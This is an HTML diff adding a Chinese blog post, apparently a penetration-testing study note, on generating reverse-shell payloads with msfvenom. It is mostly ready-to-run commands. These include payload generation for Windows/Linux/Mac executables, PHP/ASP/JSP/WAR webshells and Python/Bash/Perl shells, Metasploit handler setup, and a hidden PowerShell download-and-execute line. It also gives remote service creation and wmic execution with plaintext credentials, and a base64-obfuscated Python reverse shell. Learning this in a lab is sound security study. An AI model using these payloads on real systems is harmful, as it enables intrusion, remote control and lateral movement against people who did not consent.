@@ -540,6 +540,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -569,7 +591,135 @@
       
         
           
-            
+            <h2 id="学习msfvenom生成反弹payload总结"><a href="#学习msfvenom生成反弹payload总结" class="headerlink" title="学习msfvenom生成反弹payload总结"></a>学习msfvenom生成反弹payload总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code>   我们知道目前来说流行的shell主要有两种，一种是**正向shell(bind_shell)**一种是**反向shell(reverse_shell)**</code></pre><p><strong>正向shell</strong>:攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。(攻击者-&gt;被攻击者)</p>
+<p><strong>反向shell:</strong>被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。(攻击者&lt;-被攻击者)</p>
+<p><strong>nc</strong>可以实现一个很简单的正向与反向shell连接的示例：</p>
+<p>正向</p>
+<p><img src="1208761-20190108155228561-656308830.png" alt=""></p>
+<p>反向</p>
+<p><img src="1208761-20190108140558839-392665606.png" alt=""></p>
+<p>对于实际的渗透测试过程来说，我们常常使用的往往是反弹shell的方式来突破边界防火墙的限制。</p>
+<p><strong>下面列举了一些使用反向shell的情况：</strong></p>
+<ul>
+<li>目标机器在一个不同（相对攻击者而言）的私有网络</li>
+<li>目标机器的防火墙阻挡了所有入口连接（这种情况正向 Shell 是会被防火墙阻挡的）.</li>
+<li>由于一些原因，你的 Payload 不能绑定在应该绑定的端口的时候</li>
+<li>你还不能确定应该选择反向 Shell 还是正向 Shell 的时候</li>
+</ul>
+<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>​        msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线。Msfvenom 在 2015 年 6 月 8 日已经替代了 msfpayload 与 msfenocde 命令，它是这两个命令的结合体。为了开始使用 msfvenom，可以首先浏览一下它所支持的命令参数：</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200427142626.png" alt=""></p>
+<pre><code>Options:
+    -p, --payload       &lt;payload&gt;    Payload to use. Specify a &#39;-&#39; or stdin to use custom payloads # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取
+        --payload-options            List the payload&#39;s standard options # 列出指定 Payload 的标准可选配置项
+    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all
+    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload # 指定 nop 在 payload 中的数量（译者注：类似堆喷射中通过 nop 滑动到 payload）
+    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list) # 指定 Payload 的输出格式
+        --help-formats               List available formats # 列出所有可用的输出格式
+    -e, --encoder       &lt;encoder&gt;    The encoder to use # 指定使用的 Encoder
+    -a, --arch          &lt;arch&gt;       The architecture to use # 指定目标系统架构
+        --platform      &lt;platform&gt;   The platform of the payload # 指定目标系统平台
+        --help-platforms             List available platforms # 列出可用的平台
+    -s, --space         &lt;length&gt;     The maximum size of the resulting payload # 设置未经编码的 Payload 的最大长度
+        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value) # 编码后的 Payload 的最大长度
+    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: &#39;\x00\xff&#39; # 设置需要在 Payload 中避免出现的字符
+    -i, --iterations    &lt;count&gt;      The number of times to encode the payload # 设置 Payload 的编码次数
+    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include # 指定包含一个额外的win32 shellcode文件
+    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template # 指定一个特定的可执行文件作为模板
+    -k, --keep                       Preserve the template behavior and inject the payload as a new thread # 保护模板程序的功能，注入的payload作为一个新的进程运行
+    -o, --out           &lt;path&gt;       Save the payload # 保存 Payload 到文件
+    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats # 指定一个变量名
+（译者注：当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）
+        --smallest                   Generate the smallest possible payload # 尽可能生成最短的 Payload
+    -h, --help                       Show this message # 帮助</code></pre><p>我们可以通过命令列出可用的payloads、encoders、nops。</p>
+<pre><code>msfvenom --list payloads
+msfvenom --list encoders
+msfvenom --list nops</code></pre><p>下面我们使用msf生成一些可用的反弹shell的paylaod。</p>
+<h4 id="生成二进制文件"><a href="#生成二进制文件" class="headerlink" title="生成二进制文件"></a>生成二进制文件</h4><p>关于二进制文件，主要介绍适用于Windows、linux、mac操作系统的payload生成与利用。</p>
+<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h5><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></pre><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></pre><h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><pre><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt;LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></pre><h5 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h5><p>针对这个部分就以Windows为例，使用上面的命令生成一个exe的payload，命令如下：</p>
+<p>攻击机:kali  192.168.153.176</p>
+<p>靶机: win7   192.168.153.160</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.153.176 LPORT=5555 -f exe -o payload.exe</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200427153433.png" alt=""></p>
+<p>复制shell.exe到Windows机器，然后kali下开启msf使用如下命令监听4444端口：</p>
+<pre><code>msfconsole    //启动msf
+
+use exploit/multi/handler          //使用msf的侦听模块exploit/multi/handler
+
+set PAYLOAD windows/meterpreter/reverse_tcp        //设置载荷payload
+
+set LHOST 192.168.153.176               //设置本地监听机Ip
+
+set LPORT  4444              //设置监听端口
+
+exploit </code></pre><p>执行完之后在Windows下执行payload.exe，然后结果如图：</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200427153539.png" alt=""></p>
+<p>在这里既然使用到了在Windows下执行应用程序，我们就大概盘点一下在Windows执行应用程序的几种方式：</p>
+<ul>
+<li>双击运行</li>
+<li>cmd下运行exe</li>
+<li>利用Powershell远程下载执行</li>
+</ul>
+<pre><code>powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile(&#39;http://127.0.0.1:8089&#39;,&#39;shell.exe&#39;);
+start-process shell.exe</code></pre><ul>
+<li>利用at或schtasks设置计划任务执行</li>
+</ul>
+<pre><code>net use \\192.168.17.138\c$ &quot;admin123&quot; /user:pt007
+net use
+dir \\192.168.17.138\c$
+copy test.exe \\192.168.17.138\c$
+sc \\192.168.17.138 create test binpath= &quot;c:\test.exe&quot;
+sc \\192.168.17.138 start test
+sc \\192.168.17.138 del test</code></pre><ul>
+<li>利用wmic远程命令执行</li>
+</ul>
+<pre><code>wmic /node:192.168.1.158 /user:pt007 /password:admin123  process call create &quot;cmd.exe /c ipconfig&gt;d:\result.txt&quot;</code></pre><h4 id="生成webshell脚本"><a href="#生成webshell脚本" class="headerlink" title="生成webshell脚本"></a><strong>生成webshell脚本</strong></h4><p>​    在做web渗透的时候，经常会用到webshell，我们经常用的一句话用菜刀连接，这里介绍下如何使用msfvenom生成webshell。</p>
+<h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php
+cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></pre><h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f asp <span class="token operator">></span> shell<span class="token punctuation">.</span>asp</code></pre>
+<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p java<span class="token operator">/</span>jsp_shell_reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>jsp</code></pre>
+<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p java<span class="token operator">/</span>jsp_shell_reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f war <span class="token operator">></span> shell<span class="token punctuation">.</span>war</code></pre>
+<h4 id="如何利用-1"><a href="#如何利用-1" class="headerlink" title="如何利用"></a>如何利用</h4><p>下面以php为例做一下测试，使用以下命令生成一个webshell：</p>
+<pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p php<span class="token operator">/</span>meterpreter_reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">88.128</span> LPORT<span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>php</code></pre>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200427151118.png" alt=""></p>
+<p>在kali上使用msf执行下面的命令，监听端口4444：</p>
+<pre class=" language-java"><code class="language-java">msfconsole
+
+use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler 
+
+set PAYLOAD php<span class="token operator">/</span>meterpreter_reverse_tcp 
+
+set LHOST <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">153.176</span>
+
+set LPORT  <span class="token number">4444</span> 
+
+exploit</code></pre>
+<p>将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p>
+<pre class=" language-java"><code class="language-java">php shell<span class="token punctuation">.</span>php</code></pre>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200427152102.png" alt=""></p>
+<h4 id="脚本shell"><a href="#脚本shell" class="headerlink" title="脚本shell"></a>脚本shell</h4><p>关于使用脚本反弹shell的方式，主要以python、bash、perl为例。</p>
+<p>这种反弹方式也叫做<strong>git解释性脚本语言反弹shell</strong></p>
+<h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_python LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>py</code></pre>
+<h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_bash LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>sh</code></pre>
+<h5 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h5><pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_perl LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> LPORT<span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>pl</code></pre>
+<h5 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h5><p>下面就以Python为例做一下测试，使用以下命令生成一个脚本：</p>
+<pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_python LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">153.176</span> LPORT<span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>py</code></pre>
+<p>在kali上使用msf执行下面的命令，监听端口4444：</p>
+<pre class=" language-java"><code class="language-java">msfconsole 
+
+use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler 
+
+set PAYLOAD cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_python 
+
+set LHOST <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">153.176</span> set LPORT  <span class="token number">4444</span> 
+
+exploit </code></pre>
+<p>然后复制shell.py中的内容在linux命令行下执行，如下：</p>
+<pre class=" language-java"><code class="language-java">python <span class="token operator">-</span>c <span class="token string">"exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"</span></code></pre>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200427150606.png" alt=""></p>
+<p>结果如图：</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200427150633.png" alt=""></p>
+<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/2380" target="_blank" rel="noopener">https://xz.aliyun.com/t/2380</a></p>
+<p><a href="https://blog.51cto.com/13539934/2113551" target="_blank" rel="noopener">https://blog.51cto.com/13539934/2113551</a></p>
+<p>[<a href="https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]" target="_blank" rel="noopener">https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]</a>(</p>
+
           
         
       
